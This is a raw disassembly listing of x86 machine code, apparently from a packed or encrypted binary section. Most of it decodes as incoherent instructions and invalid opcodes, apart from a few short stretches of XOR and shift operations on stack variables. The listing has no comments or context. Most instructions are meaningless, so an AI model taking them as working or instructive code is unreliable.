  405d4b:	add    dh,BYTE PTR [esi]
  405d4d:	dec    eax
  405d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d4f:	rol    BYTE PTR [ebx],1
  405d51:	loope  0x405d31
  405d53:	les    ecx,FWORD PTR [esi]
  405d55:	(bad)  
  405d56:	xchg   ebp,eax
  405d57:	mov    cl,0x74
  405d59:	mov    ah,0x3f
  405d5b:	gs clc 
  405d5d:	mov    bh,0x1b
  405d5f:	lods   al,BYTE PTR ds:[esi]
  405d60:	mov    eax,ds:0xf64f3885
  405d65:	dec    esp
  405d66:	ret    0x421c
  405d69:	xor    BYTE PTR [esi+0x441eaa82],0xfe
  405d70:	enter  0x5101,0x76
  405d74:	outs   dx,DWORD PTR es:[esi]
  405d76:	jmp    0xfbf3:0x678458fb
  405d7d:	mov    dh,0x46
  405d7f:	dec    edi
  405d80:	sbb    DWORD PTR [ecx-0x76],esp
  405d83:	ret    
  405d84:	arpl   WORD PTR [esi-0x1b38c352],ax
  405d8a:	arpl   WORD PTR [eax],ax
  405d8c:	jo     0x405db4
  405d8e:	sbb    esi,DWORD PTR ds:0x3bd26491
  405d94:	dec    edx
  405d95:	test   al,0x90
  405d97:	dec    DWORD PTR [edi]
  405d99:	sub    al,0xd7
  405d9b:	xchg   ebp,eax
  405d9c:	pop    ebp
  405d9d:	mov    WORD PTR [ecx-0x5c56eec],cs
  405da3:	push   0x352454d5
  405da8:	daa    
  405da9:	ret    0xe0fe
  405dac:	xor    DWORD PTR [bx-0x3952],ebx
  405db1:	xor    eax,0x5ab7a135
  405db6:	xor    al,BYTE PTR [edi-0x6f5b239b]
  405dbc:	daa    
  405dbd:	mov    BYTE PTR [edx],dh
  405dbf:	inc    ecx
  405dc0:	shl    BYTE PTR [ecx],cl
  405dc2:	and    DWORD PTR [esi],esp
  405dc4:	daa    
  405dc5:	mov    eax,0xb18ae682
  405dca:	fimul  WORD PTR [edx-0x5a89b471]
  405dd0:	fwait
  405dd1:	imul   eax,DWORD PTR [ebp+0x70],0xb2494c3d
  405dd8:	sar    DWORD PTR [esi-0x17c355a4],1
  405dde:	addr16 adc esi,ebp
  405de1:	(bad)  
  405de2:	in     al,dx
  405de3:	jge    0x405d69
  405de5:	sbb    bh,dl
  405de7:	shl    DWORD PTR [edi+0x4c],cl
  405dea:	add    eax,0x2c980757
  405def:	ret    0x4ac1
  405df2:	xor    eax,0xf36db599
  405df7:	test   al,cl
  405df9:	xchg   ebp,eax
  405dfa:	jae    0x405e43
  405dfc:	into   
  405dfd:	hlt    
  405dfe:	std    
  405dff:	or     BYTE PTR [edi],bh
  405e01:	aas    
  405e02:	in     eax,0xa7
  405e04:	push   edx
  405e05:	xor    eax,0xfdc7f738
  405e0a:	(bad)  
  405e0b:	mov    al,0xc7
  405e0d:	mov    ds:0xcd568cee,eax
  405e12:	pop    ecx
  405e13:	lds    ecx,FWORD PTR [esi+0x6c]
  405e16:	das    
  405e17:	mov    ?,WORD PTR [ebx-0x1173e930]
  405e1d:	cmc    
  405e1e:	push   0xffffffc3
  405e20:	jne    0x405dea
  405e22:	and    al,0xd8
  405e24:	adc    DWORD PTR [edx+0x5f],0xffffffa5
  405e28:	add    eax,0x53788c5a
  405e2d:	and    DWORD PTR [ebx],ecx
  405e2f:	mov    BYTE PTR [edx],al
  405e31:	(bad)  
  405e32:	int3   
  405e33:	add    DWORD PTR [eax],eax
  405e35:	mov    edi,0xa166e676
  405e3a:	daa    
  405e3b:	xchg   esi,eax
  405e3c:	(bad)  
  405e3d:	(bad)  
  405e3e:	repnz mov ch,0x64
  405e41:	shl    BYTE PTR [ebp+esi*4+0x6c],1
  405e45:	(bad)
  405e4b:	aad    0x87
  405e4d:	pop    ebx
  405e4e:	sub    eax,0x17d6b343
  405e53:	arpl   WORD PTR [ecx+0x7dc53664],ax
  405e59:	sbb    eax,0x50777404
  405e5e:	lahf   
  405e5f:	fwait
  405e60:	ins    BYTE PTR es:[edi],dx
  405e61:	aad    0xc9
  405e63:	call   0xbcc3:0xf62a1168
  405e6a:	xchg   edx,eax
  405e6b:	sbb    DWORD PTR [eax+0x65b5b5a6],ebx
  405e71:	push   ds
  405e72:	ja     0x405e3c
  405e74:	inc    edi
  405e75:	test   al,0xf8
  405e77:	not    BYTE PTR [edi-0x36c1c6e7]
  405e7d:	sbb    DWORD PTR [edx*1-0x7f00eb7e],0xf6f42e6
  405e88:	pop    ebp
  405e89:	xor    al,0x0
  405e8b:	dec    edx
  405e8c:	pushf  
  405e8d:	iret   
  405e8e:	add    al,0x87
  405e90:	jle    0x405edc
  405e92:	pop    ss
  405e93:	into   
  405e94:	(bad)  [eax+esi*8+0x7e]
  405e98:	fyl2xp1 
  405e9a:	test   ebp,esp
  405e9c:	jge    0x405e66
  405e9e:	pop    eax
  405e9f:	je     0x405e7a
  405ea1:	punpckhbw mm4,mm4
  405ea4:	std    
  405ea5:	cmp    edx,DWORD PTR [ebp-0x79b89546]
  405eab:	push   ds
  405eac:	enter  0x6dbc,0x6d
  405eb0:	push   ds
  405eb1:	ja     0x405eed
  405eb3:	xor    ch,BYTE PTR [edx*1-0x3bf7f37]
  405eba:	mov    al,ds:0x7013538e
  405ebf:	in     eax,0x8c
  405ec1:	(bad)  
  405ec2:	fcom   QWORD PTR ds:0x244704ae
  405ec8:	lods   eax,DWORD PTR ds:[esi]
  405ec9:	enter  0xd6e1,0x9c
  405ecd:	pop    ebx
  405ece:	jne    0x405ea1
  405ed0:	inc    edx
  405ed1:	push   es
  405ed2:	fldenv [eax]
  405ed4:	jns    0x405ee2
  405ed6:	call   0x82770abb
  405edb:	mov    ah,0xd4
  405edd:	cmp    DWORD PTR [esi+0xc],esi
  405ee0:	mov    esi,0xef919ed6
  405ee5:	xchg   ebx,eax
  405ee6:	xor    esi,edi
  405ee8:	in     al,0x43
  405eea:	sub    al,0x50
  405eec:	push   ebp
  405eed:	arpl   WORD PTR [ebx+0x64],dx
  405ef0:	jge    0x405f54
  405ef2:	ret    0x3a35
  405ef5:	ds ret 
  405ef7:	imul   ebx,DWORD PTR [esi+eax*8],0xccb66ebc
  405efe:	out    0xe1,eax
  405f00:	add    BYTE PTR [ebx],al
  405f02:	in     eax,0x1e
  405f04:	add    al,0x91
  405f06:	fwait
  405f07:	jecxz  0x405ecb
  405f09:	sar    BYTE PTR [ebx-0x6],0xae
  405f0d:	xor    bl,ch
  405f0f:	iret   
  405f10:	lahf   
  405f11:	mov    BYTE PTR [esi-0x5a],dl
  405f14:	mov    cl,0x47
  405f16:	or     al,0x65
  405f18:	nop
  405f19:	out    0xd4,eax
  405f1b:	jae    0x405ed9
  405f1d:	test   al,0x42
  405f1f:	dec    ebp
  405f20:	add    BYTE PTR [edi+0x18],al
  405f23:	mov    ch,0x73
  405f25:	stos   BYTE PTR es:[edi],al
  405f26:	fs push ds
  405f28:	lods   eax,DWORD PTR ds:[esi]
  405f29:	and    BYTE PTR [esi-0x5f],dh
  405f2c:	jle    0x405eea
  405f2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f2f:	loope  0x405f37
  405f31:	xor    DWORD PTR [eax+0x67],esp
  405f34:	cmp    BYTE PTR [eax+0x62],bh
  405f37:	inc    ebx
  405f38:	sbb    BYTE PTR [ecx+0x6f63ff63],al
  405f3e:	(bad)  
  405f3f:	fcomp  QWORD PTR [edi+0x23]
  405f42:	cmc    
  405f43:	and    DWORD PTR [edx-0x628cf251],edx
  405f49:	retf   
  405f4a:	(bad)  
  405f4b:	jne    0x405f59
  405f4d:	ret    
  405f4e:	shl    DWORD PTR [ebx],1
  405f50:	mov    DWORD PTR [ecx-0x70b21242],ecx
  405f56:	adc    esi,DWORD PTR ds:0xd2925fbb
  405f5c:	neg    BYTE PTR [edx]
  405f5e:	xchg   edx,eax
  405f5f:	add    dh,BYTE PTR [ecx+0x59b69daa]
  405f65:	jl     0x405fd1
  405f67:	(bad)  
  405f69:	add    DWORD PTR [edi+0x1bc62280],edi
  405f6f:	dec    edi
  405f70:	repnz inc edx
  405f72:	das    
  405f73:	dec    ebx
  405f74:	mov    dl,0x9c
  405f76:	sub    ax,0x6e62
  405f7a:	out    0x9f,eax
  405f7c:	jecxz  0x405f6c
  405f7e:	sub    al,BYTE PTR [eax+0x356436b8]
  405f84:	adc    eax,0xb6cc96ce
  405f89:	pop    ebx
  405f8a:	outs   dx,DWORD PTR ds:[esi]
  405f8b:	test   DWORD PTR [ecx+0x240e662],esp
  405f91:	xor    bh,BYTE PTR [eax]
  405f93:	jge    0x405f26
  405f95:	outs   dx,DWORD PTR ds:[esi]
  405f96:	lahf   
  405f97:	sub    al,0xfc
  405f99:	dec    edx
  405f9a:	or     BYTE PTR [edi-0x53],0x7b
  405f9e:	sbb    esi,ebp
  405fa0:	sbb    dh,bl
  405fa2:	daa    
  405fa3:	ret    
  405fa4:	mov    dh,0xf0
  405fa6:	(bad)  
  405fa7:	mov    ecx,0xb9a2ec0d
  405fac:	sub    esi,DWORD PTR [esi]
  405fae:	(bad)  
  405faf:	fdiv   QWORD PTR [eax]
  405fb1:	and    edi,ecx
  405fb3:	dec    edi
  405fb4:	push   ds
  405fb5:	mov    BYTE PTR [eax-0x43e56fa9],dl
  405fbb:	xchg   esp,eax
  405fbc:	inc    ebx
  405fbd:	fs jl  0x40602b
  405fc0:	mov    ds:0x591a5158,al
  405fc5:	adc    BYTE PTR [ebp-0x6bc61d6b],bh
  405fcb:	mov    cl,0xfc
  405fcd:	add    DWORD PTR [edi],ecx
  405fcf:	xor    BYTE PTR [esi+0x36c2287a],dl
  405fd5:	fcomp  QWORD PTR [esi-0x7bee4a93]
  405fdb:	jmp    0x40605b
  405fdd:	retf   
  405fde:	sbb    bl,ah
  405fe0:	sub    DWORD PTR [edx-0x566765c3],esi
  405fe6:	add    DWORD PTR [eax],edi
  405fe8:	jl     0x405fe1
  405fea:	push   esi
  405feb:	dec    eax
  405fec:	jbe    0x40600f
  405fee:	cmp    BYTE PTR [ebx+0x7d],bh
  405ff1:	mov    dh,cl
  405ff3:	mov    bl,0xb0
  405ff5:	dec    BYTE PTR [esi+0x29aca7b3]
  405ffb:	or     dl,BYTE PTR [edx]
  405ffd:	dec    esp
  405ffe:	and    esp,eax
  406000:	das    
  406001:	inc    ebx
  406002:	leave  
  406003:	jno    0x405f8c
  406005:	outs   dx,DWORD PTR ds:[esi]
  406006:	and    ah,BYTE PTR [ebx+0x3c]
  406009:	ins    BYTE PTR es:[edi],dx
  40600a:	fwait
  40600b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40600c:	dec    ecx
  40600d:	call   0x4fb2613f
  406012:	push   ebp
  406013:	je     0x405ff2
  406015:	cmp    cl,ah
  406017:	outs   dx,BYTE PTR ds:[esi]
  406018:	dec    esi
  406019:	fcomi  st,st(2)
  40601b:	push   es
  40601c:	daa    
  40601d:	test   BYTE PTR [ecx-0x23ebed76],ah
  406023:	mov    ds:0x25496bc9,eax
  406028:	cmp    al,0xef
  40602a:	pop    ecx
  40602b:	out    0x43,eax
  40602d:	and    cl,bh
  40602f:	pop    esp
  406030:	lea    edx,[ecx+ecx*4]
  406033:	es dec esp
  406035:	outs   dx,DWORD PTR ds:[esi]
  406036:	xchg   DWORD PTR [ecx],esi
  406038:	add    BYTE PTR [ecx],al
  40603a:	xor    edi,DWORD PTR [edx]
  40603c:	(bad)  
  40603d:	adc    BYTE PTR [ebp+0xd],ch
  406040:	sub    DWORD PTR [esp+edx*8+0x4],0xffffffa8
  406045:	pop    esi
  406046:	shl    DWORD PTR [ebp-0x46],1
  406049:	jmp    0x4060c2
  40604b:	mov    ebx,0x7cc65b0d
  406050:	fld    TBYTE PTR [ebp+0x1c]
  406053:	pop    ds
  406054:	jno    0x406061
  406056:	dec    ecx
  406057:	ret    0x769e
  40605a:	nop
  40605b:	loop   0x40608a
  40605d:	fs stos DWORD PTR es:[edi],eax
  40605f:	xlat   BYTE PTR ds:[ebx]
  406060:	jbe    0x40601c
  406062:	sbb    BYTE PTR fs:[esi],dl
  406065:	xchg   ebp,eax
  406066:	stos   BYTE PTR es:[edi],al
  406067:	and    bh,BYTE PTR [esi+0x3952f9d7]
  40606d:	jbe    0x406086
  40606f:	adc    DWORD PTR [ecx],ebp
  406071:	sub    bl,bl
  406073:	loope  0x40600d
  406075:	js     0x4060ea
  406077:	ins    DWORD PTR es:[edi],dx
  406078:	ja     0x406043
  40607a:	and    ch,0x2e
  40607d:	sub    DWORD PTR [edx+ecx*2-0x3a],esp
  406081:	jmp    0x406099
  406083:	iret   
  406084:	test   eax,0xce79ddac
  406089:	sti    
  40608a:	mov    dh,0x6b
  40608c:	xchg   ebx,eax
  40608d:	scas   al,BYTE PTR es:[edi]
  40608e:	fisttp WORD PTR [edx+0x644d0896]
  406094:	cli    
  406095:	sar    BYTE PTR ds:0x49d7727e,cl
  40609b:	push   0x696cf3c
  4060a0:	daa    
  4060a1:	pop    eax
  4060a2:	adc    bl,bh
  4060a4:	mov    eax,ds:0xaa3d0913
  4060a9:	pop    eax
  4060aa:	xor    al,0x95
  4060ac:	or     eax,DWORD PTR [ecx+0x65]
  4060af:	push   ebp
  4060b0:	xchg   edx,eax
  4060b1:	inc    edx
  4060b2:	imul   ecx,DWORD PTR [eax+0x1b],0x1cbd0140
  4060b9:	jp     0x406077
  4060bb:	rcr    BYTE PTR [ecx+0xb361be3],1
  4060c1:	dec    edi
  4060c2:	cmp    BYTE PTR fs:[eax],dl
  4060c5:	xor    esp,DWORD PTR ds:0xc7f5ec19
  4060cb:	iret   
  4060cc:	(bad)  
  4060cd:	jne    0x4060ba
  4060cf:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060d1:	sbb    al,0xf2
  4060d3:	jmp    0x406083
  4060d5:	repnz test al,0xfe
  4060d8:	ja     0x4060e3
  4060da:	xor    dl,bl
  4060dc:	sahf   
  4060dd:	imul   edi,DWORD PTR [edi+esi*1+0x71f2734d],0x96d91999
  4060e8:	sahf   
  4060e9:	xor    edx,DWORD PTR [ecx+0x4522708a]
  4060ef:	sbb    al,0xd3
  4060f2:	and    DWORD PTR ds:0x8dbe9113,0x89fc0544
  4060fc:	inc    ebp
  4060fd:	int3   
  4060fe:	mov    eax,DWORD PTR [ebp-0x30]
  406101:	mov    ecx,DWORD PTR [ebp-0x2c]
  406104:	shrd   eax,ecx,0x2
  406108:	shr    ecx,0x2
  40610b:	mov    ecx,DWORD PTR [ebp-0x30]
  40610e:	mov    edx,DWORD PTR [ebp-0x2c]
  406111:	shl    ecx,0x1e
  406114:	mov    ecx,DWORD PTR [ebp-0x14]
  406117:	xor    eax,edi
  406119:	xor    edx,edx
  40611b:	jmp    0x4064f9
  406120:	sar    DWORD PTR [ebx+0x5b],cl
  406123:	mov    ecx,0x5b3bb91b
  406128:	lds    eax,FWORD PTR [ebx+0x27]
  40612b:	stos   BYTE PTR es:[edi],al
  40612c:	mov    ecx,0x78aae327
  406131:	mov    ds:0x129e1818,eax
  406136:	sbb    BYTE PTR [eax],bl
  406138:	inc    ecx
  406139:	and    eax,0x27192943
  40613e:	jecxz  0x4060df
  406140:	fsubr  DWORD PTR ds:[ebp+eax*8-0x74]
  406145:	in     eax,dx
  406146:	push   0xfffffffa
  406148:	and    eax,0x27adabdc
  40614d:	icebp  
  40614e:	jmp    0x40610d
  406150:	xor    ebp,esp
  406152:	ja     0x406164
  406154:	(bad)
  406157:	jbe    0x40615c
  406159:	popf   
  40615a:	jmp    0x4a35:0xf0dd65f4
  406161:	pop    ebx
  406162:	jne    0x4060e9
  406164:	push   esp
  406165:	xchg   edx,eax
  406166:	pop    esp
  406167:	mov    ebp,0x908f6612
  40616c:	and    eax,0x30aedb27
  406171:	retf   0xf0b2
  406174:	outs   dx,BYTE PTR ds:[esi]
  406175:	adc    BYTE PTR [ecx+0xb],bh
  406178:	mov    al,ds:0x88d9292a
  40617d:	mov    eax,esi
  40617f:	mov    al,0x2c
  406181:	in     eax,dx
  406182:	add    BYTE PTR ds:0x5e156011,al
  406188:	(bad)  [edi+0xe5a4407]
  40618e:	test   BYTE PTR [esi],ah
  406190:	lods   eax,DWORD PTR ds:[esi]
  406191:	inc    ebx
  406192:	mov    DWORD PTR [esi-0x42],ebx
  406195:	pop    ds
  406196:	xor    DWORD PTR [eax-0x68],esp
  406199:	sbb    BYTE PTR [ebp+0x5533c8b6],ch
  40619f:	add    bl,dl
  4061a1:	sub    eax,0x8d01fe72
  4061a6:	xchg   esp,esi
  4061a8:	enter  0x315c,0x54
  4061ac:	xchg   edi,eax
  4061ad:	sub    bl,ch
  4061af:	adc    DWORD PTR [ecx],0x79
  4061b2:	sub    al,0x49
  4061b4:	sbb    al,0x87
  4061b6:	mov    ebp,0x7694238b
  4061bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061bc:	imul   ebx,DWORD PTR [edi-0x4d],0x73979e55
  4061c3:	cs stos BYTE PTR es:[edi],al
  4061c5:	xor    eax,0x24afb5f
  4061ca:	sti    
  4061cb:	ja     0x406220
  4061cd:	mov    eax,0x4a80756
  4061d2:	popf   
  4061d3:	jmp    0x4061ad
  4061d5:	stos   DWORD PTR es:[edi],eax
  4061d6:	xor    BYTE PTR es:[edx],0x24
  4061da:	dec    edx
  4061db:	mov    ah,0x9b
  4061dd:	call   0x3c48879
  4061e2:	mov    BYTE PTR [ebx],dl
  4061e4:	imul   ecx,DWORD PTR [ebx+0x52e5c0a0],0x3e5f55f0
  4061ee:	fldenv [ecx+eax*2+0x10]
  4061f2:	jmp    0xeaf1:0xc3a4057c
  4061f9:	es in  al,dx
  4061fb:	mov    al,ds:0x509b8be2
  406200:	mul    BYTE PTR [ebx]
  406202:	data16 xor dh,bh
  406205:	mov    ds:0xf8a6888f,al
  40620a:	cmp    ah,BYTE PTR [edx]
  40620c:	adc    al,0x1
  40620e:	or     dl,al
  406210:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406211:	adc    al,bh
  406213:	ss xor eax,0x8028b328
  406219:	sbb    ah,dh
  40621b:	xor    esi,DWORD PTR [ebp-0x66]
  40621e:	scas   al,BYTE PTR es:[edi]
  40621f:	mov    esi,0xb97912d1
  406224:	imul   ebx,DWORD PTR [ecx-0x3878e792],0xffffff8d
  40622b:	popf   
  40622c:	push   edx
  40622d:	bound  ecx,QWORD PTR [ecx-0x267cd4cb]
  406233:	add    DWORD PTR [ebp+ebx*4-0x18],edi
  406237:	ret    0x775b
  40623a:	and    DWORD PTR [edx+ecx*1+0x75e08c72],esi
  406241:	arpl   WORD PTR [esi-0x1a50e05a],si
  406247:	and    al,dl
  406249:	mov    ebx,0x844816ac
  40624e:	jne    0x406204
  406250:	aas    
  406251:	dec    esi
  406252:	addr16 adc eax,0xc541f9e7
  406258:	lods   al,BYTE PTR ds:[esi]
  406259:	(bad)  
  40625a:	clc    
  40625b:	sub    bl,dh
  40625d:	jne    0x406224
  40625f:	daa    
  406260:	aad    0x5d
  406262:	jbe    0x406266
  406264:	in     eax,0xb0
  406266:	add    ch,0x78
  406269:	fdivr  QWORD PTR [eax]
  40626b:	and    al,0x82
  40626d:	data16 jecxz 0x4062e9
  406270:	xchg   esi,eax
  406271:	sahf   
  406272:	fld    DWORD PTR [edi]
  406274:	adc    dh,BYTE PTR [ecx+0x3c65cf43]
  40627a:	xor    BYTE PTR [ecx],ah
  40627c:	scas   eax,DWORD PTR es:[edi]
  40627d:	scas   eax,DWORD PTR es:[edi]
  40627e:	xchg   DWORD PTR [ebx],ebp
  406280:	jge    0x40625b
  406282:	push   0x2f
  406284:	add    BYTE PTR [ebp+0x34],dh
  406287:	lds    eax,FWORD PTR [esi-0x7afb5db1]
  40628d:	lea    edi,[edi]
  40628f:	loope  0x406249
  406291:	cmp    DWORD PTR [ecx],0xffffffab
  406294:	pop    ebx
  406295:	dec    ecx
  406296:	lods   eax,DWORD PTR ds:[esi]
  406297:	loope  0x4062c7
  406299:	aas    
  40629a:	int    0xc
  40629c:	push   cs
  40629d:	xchg   esp,eax
  40629e:	ds xchg esi,eax
  4062a0:	adc    eax,0xc88acc0d
  4062a5:	push   es
  4062a6:	cli    
  4062a7:	dec    edx
  4062a8:	jns    0x406265
  4062aa:	push   ds
  4062ab:	dec    ebp
  4062ac:	mov    bl,0xb8
  4062ae:	mov    esi,es
  4062b0:	xor    ecx,DWORD PTR [esi]
  4062b2:	mov    dl,0x81
  4062b4:	jmp    0x958:0x831708f
  4062bb:	mov    ?,ebx
  4062bd:	mov    ecx,esi
  4062bf:	jl     0x4062dd
  4062c1:	icebp  
  4062c2:	mov    ebx,0x397efd8
  4062c7:	push   edx
  4062c8:	(bad)  
  4062c9:	lea    ax,ds:0x8c2f319a
  4062d0:	pop    edi
  4062d1:	sbb    eax,0xe1acc553
  4062d6:	mov    ecx,0x64e0bcda
  4062db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062dc:	imul   BYTE PTR [bp+0x488]
  4062e1:	dec    esp
  4062e2:	cs push edi
  4062e4:	jge    0x406279
  4062e6:	enter  0x1734,0x2c
  4062ea:	sub    al,0x88
  4062ec:	pop    edx
  4062ed:	frstor [ebx+0x37aa5951]
  4062f3:	and    ebx,edi
  4062f5:	and    ebp,DWORD PTR [ebp-0x4bc5df37]
  4062fb:	loop   0x406374
  4062fd:	mov    edx,0xf04fa895
  406302:	add    DWORD PTR [edi],ebp
  406304:	sub    ebx,esp
  406306:	cdq    
  406307:	in     eax,0x57
  406309:	pop    esi
  40630a:	jecxz  0x406366
  40630c:	lods   al,BYTE PTR ds:[esi]
  40630d:	rcr    DWORD PTR [edi+0x2e59c4fd],0x6b
  406314:	sbb    edi,DWORD PTR [edx+0x2]
  406317:	sbb    eax,0x25d876ea
  40631c:	mov    dh,0x8e
  40631e:	clc    
  40631f:	adc    eax,0xfba6e0fd
  406324:	adc    cl,0x39
  406327:	pop    edx
  406328:	cld    
  406329:	sar    BYTE PTR [edi],cl
  40632b:	(bad)  
  40632c:	mov    ecx,0xb3db63e1
  406331:	xor    dh,BYTE PTR [eax]
  406333:	int3   
  406334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406335:	push   ss
  406336:	and    al,0xed
  406338:	ja     0x4062d1
  40633a:	pusha  
  40633b:	xchg   edi,eax
  40633c:	inc    ecx
  40633d:	inc    esp
  40633e:	mov    ?,WORD PTR cs:[esi+0x1]
  406342:	sub    al,al
  406344:	outs   dx,DWORD PTR ds:[esi]
  406345:	ja     0x406348
  406347:	xchg   eax,ecx
  406349:	bound  ebx,QWORD PTR [edx+0x46]
  40634c:	test   DWORD PTR [eax],0x83fca32a
  406352:	xor    al,0x2a
  406354:	jmp    0x5f71:0xdccd4f55
  40635b:	mov    ah,0x82
  40635d:	ret    0x2f90
  406360:	push   esp
  406361:	mov    ebp,DWORD PTR [ecx-0x614b3a61]
  406367:	and    ecx,DWORD PTR [esi+0x72edadfa]
  40636d:	shl    DWORD PTR [edx+esi*4+0x47797278],0x87
  406375:	in     al,dx
  406376:	and    al,BYTE PTR [ecx+0x64d9ee36]
  40637c:	add    bl,BYTE PTR [edx+0x392768b0]
  406382:	push   ebp
  406383:	mov    ecx,eax
  406385:	xor    edi,DWORD PTR [esi]
  406387:	pop    ebp
  406388:	xchg   ebx,eax
  406389:	pop    edi
  40638a:	pop    esp
  40638b:	in     eax,0x54
  40638d:	imul   ebx,edi,0xf74cac00
  406393:	mov    eax,0x4c23d68d
  406398:	aam    0x39
  40639a:	sub    ecx,DWORD PTR [esi+0x3f]
  40639d:	call   0xf40559e0
  4063a2:	std    
  4063a3:	push   edx
  4063a4:	into   
  4063a5:	je     0x406404
  4063a7:	gs enter 0x49c0,0x93
  4063ac:	arpl   di,dx
  4063ae:	cmp    eax,0x656fa70f
  4063b3:	es mov eax,0x4cbe0f12
  4063b9:	push   ecx
  4063ba:	mov    dh,0x31
  4063bc:	inc    eax
  4063bd:	into   
  4063be:	dec    edx
  4063bf:	movlps xmm2,QWORD PTR ds:0xa6e74e16
  4063c6:	jp     0x406436
  4063c8:	div    ebp
  4063ca:	mov    esp,0xd9c0152c
  4063cf:	sbb    al,0xb0
  4063d1:	jle    0x4063b0
  4063d3:	dec    esi
  4063d4:	sbb    dl,BYTE PTR [edi+0xf]
  4063d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063d8:	out    dx,al
  4063d9:	and    esi,ebx
  4063db:	jmp    0xb6b2:0x8c638de6
  4063e2:	push   ebx
  4063e3:	and    dh,BYTE PTR [edi+0x7f]
  4063e6:	mov    BYTE PTR [eax],0xa8
  4063e9:	popf   
  4063ea:	es pop eax
  4063ec:	jg     0x4063f9
  4063ee:	pop    esi
  4063ef:	sbb    al,0xf1
  4063f1:	cmp    edi,DWORD PTR [esi+eax*1+0x2f]
  4063f5:	add    al,0xf1
  4063f7:	pop    esp
  4063f8:	sar    BYTE PTR [ebp+ebx*4-0x42],0xc4
  4063fd:	imul   BYTE PTR [edx]
  4063ff:	shl    BYTE PTR [ebx],cl
  406401:	retf   
  406402:	push   0xffffffe4
  406404:	sti    
  406405:	jnp    0x406463
  406407:	sub    BYTE PTR [ecx+edi*2+0x4e],ah
  40640b:	xchg   DWORD PTR ds:0x7aea2487,esi
  406411:	dec    eax
  406412:	(bad)  
  406413:	(bad)  
  406415:	mov    dl,0x7a
  406417:	pop    esp
  406418:	pusha  
  406419:	adc    bl,dl
  40641b:	dec    al
  40641d:	and    eax,0xd2f0cb60
  406422:	mov    ds:0x1ad88b9e,al
  406427:	pop    es
  406428:	mov    eax,ds:0x79a8ddb3
  40642d:	xor    DWORD PTR ss:[bx],edi
  406431:	call   0x685b01e7
  406436:	jl     0x406411
  406438:	or     bh,BYTE PTR [ebx]
  40643a:	pop    esp
  40643b:	cli    
  40643c:	mov    ch,0xce
  40643e:	fwait
  40643f:	cmp    BYTE PTR [edi+0xc],ah
  406442:	test   BYTE PTR [ebp+0x14dff2d3],bl
  406448:	xchg   ebx,eax
  406449:	dec    edi
  40644a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40644b:	je     0x406497
  40644d:	(bad)  
  40644e:	movsx  edi,cl
  406451:	xchg   esi,eax
  406452:	push   ds
  406453:	and    al,0xb3
  406455:	sub    eax,0xc5a2c14c
  40645a:	shr    DWORD PTR [esi],0x44
  40645d:	mov    ebp,?
  40645f:	and    DWORD PTR [eax-0x46f747f5],ebx
  406465:	pop    edx
  406466:	je     0x4064a6
  406468:	sub    BYTE PTR [ebx],0xd2
  40646b:	hlt    
  40646c:	add    BYTE PTR [ecx],0x53
  40646f:	sbb    dl,BYTE PTR [edx+0x52]
  406472:	out    dx,al
  406473:	xchg   edi,eax
  406474:	mov    esi,0x6c7c198b
  406479:	neg    ch
  40647b:	in     eax,dx
  40647c:	loopne 0x4064d5
  40647e:	jmp    0x7c9:0xd38ce864
  406485:	jp     0x40641f
  406487:	inc    edx
  406488:	imul   ecx,DWORD PTR [edi],0x53
  40648b:	mov    dh,0x1f
  40648d:	xchg   DWORD PTR [ebp+0x62fe6f3b],ebp
  406493:	rol    ch,1
  406495:	into   
  406496:	js     0x406462
  406498:	test   eax,0x6a49ead7
  40649d:	pop    fs
  40649f:	or     ah,0x49
  4064a2:	mov    eax,ds:0xc0c0b57
  4064a7:	xor    al,0x1b
  4064a9:	jne    0x4064d1
  4064ab:	cld    
  4064ac:	clc    
  4064ad:	pop    ds
  4064ae:	cmp    BYTE PTR [eax-0x18],bl
  4064b1:	add    DWORD PTR [edi+ebp*4-0x1f],esi
  4064b5:	arpl   WORD PTR [ebp-0x5e],ax
  4064b8:	ret    
  4064b9:	fs sti 
  4064bb:	and    BYTE PTR [edi+edi*8],al
  4064be:	in     eax,0x1e
  4064c0:	ds pop esi
  4064c2:	adc    eax,0x2710d147
  4064c7:	dec    eax
  4064c8:	mov    al,0xb7
  4064ca:	fsub   DWORD PTR ds:0xb4a7b30d
  4064d0:	mov    al,ds:0x3759719f
  4064d5:	rcl    ebx,1
  4064d7:	fcmovbe st,st(4)
  4064d9:	inc    esi
  4064da:	add    ebp,DWORD PTR [eax+0x71]
  4064dd:	cmp    ebx,DWORD PTR [edx+0x76]
  4064e0:	cli    
  4064e1:	add    BYTE PTR [ebx-0x11],0x2a
  4064e5:	jbe    0x406488
  4064e7:	sbb    al,0x23
  4064e9:	inc    edx
  4064ea:	sbb    DWORD PTR [eax],esi
  4064ec:	jb     0x4064ab
  4064ee:	adc    eax,0xd6e53245
  4064f3:	push   ebx
  4064f4:	icebp  
  4064f5:	mov    WORD PTR [edx-0x3df4e4a9],ds
  4064fb:	mov    cl,BYTE PTR [eax+ecx*1]
  4064fe:	mov    eax,DWORD PTR [ebp-0x34]
  406501:	xor    BYTE PTR [eax],cl
  406503:	mov    eax,DWORD PTR [ebp-0x20]
  406506:	mov    ecx,DWORD PTR [ebp-0x1c]
  406509:	shrd   eax,ecx,0x2
  40650d:	shr    ecx,0x2
  406510:	mov    ecx,DWORD PTR [ebp-0x20]
  406513:	mov    edx,DWORD PTR [ebp-0x1c]
  406516:	xor    eax,edi
  406518:	shl    ecx,0x1e
  40651b:	xor    edx,edx
  40651d:	or     eax,edx
  40651f:	lea    eax,[ebp+eax*1-0x4]
  406523:	mov    DWORD PTR [ebp-0x34],eax
  406526:	mov    eax,DWORD PTR [ebp-0x20]
  406529:	mov    ecx,DWORD PTR [ebp-0x1c]
  40652c:	shrd   eax,ecx,0x2
  406530:	shr    ecx,0x2
  406533:	mov    ecx,DWORD PTR [ebp-0x20]
  406536:	mov    edx,DWORD PTR [ebp-0x1c]
  406539:	jmp    0x406917
  40653e:	push   es
  40653f:	sbb    ebx,DWORD PTR ds:0xc65a1d5c
